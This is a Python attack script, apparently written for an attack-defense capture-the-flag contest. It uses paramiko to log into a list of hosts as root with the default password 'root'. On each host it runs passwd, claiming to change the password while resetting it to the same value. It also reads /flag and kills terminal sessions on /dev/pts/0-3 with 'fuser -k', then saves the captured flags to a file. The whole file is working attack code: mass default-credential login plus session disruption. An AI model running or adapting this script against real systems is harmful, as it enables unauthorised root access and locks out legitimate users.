import paramiko
import socket
import re


def change_password(hostname):
    port = 22
    username = 'root'
    password = 'root'
    timeout = 1  # 设置超时时间为1秒
    print("处理主机:", hostname)

    # 创建SSH客户端
    client = paramiko.SSHClient()
    # 自动添加主机密钥
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # 连接远程主机
        client.connect(hostname, port, username, password, timeout=timeout)

        # 执行远程命令
        stdin, stdout, stderr = client.exec_command('''
        password="root"
        # 使用passwd命令修改密码
        echo -e "$password\n$password" | passwd "$USER" >/dev/null 2>&1
        # 检查密码是否成功修改
        if [ $? -eq 0 ]; then
            echo "修改密码成功"
        else
            echo "修改密码失败"
        fi
        cat /flag
        fuser -k /dev/pts/0
        fuser -k /dev/pts/1
        fuser -k /dev/pts/2
        fuser -k /dev/pts/3
        ''', timeout=timeout)

        # 打印命令输出
        a = stdout.read().decode().strip()
        print('修改密码成功')
        matches = re.findall(r'flag\{.*?\}', a)
        with open('./flag.txt', 'w', encoding='utf-8') as file:
            for match in matches:
                print('flag:', match)
                file.write(match + '\n')  # 每个匹配项后添加一个换行符
    except (socket.timeout, paramiko.ssh_exception.SSHException) as e:
        print(hostname, "连接失败或超时:", str(e))

    finally:
        # 关闭SSH连接
        client.close()


ip = []

# 打开文件
with open('../攻击主机/ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        ip.append(line.strip())
        # 读取下一行
        line = file.readline()
hosts = [url.split("//")[1].split("/")[0] for url in ip]
for i in range(0, len(hosts)):
    a = change_password(hosts[i])

# change_password(hostname)
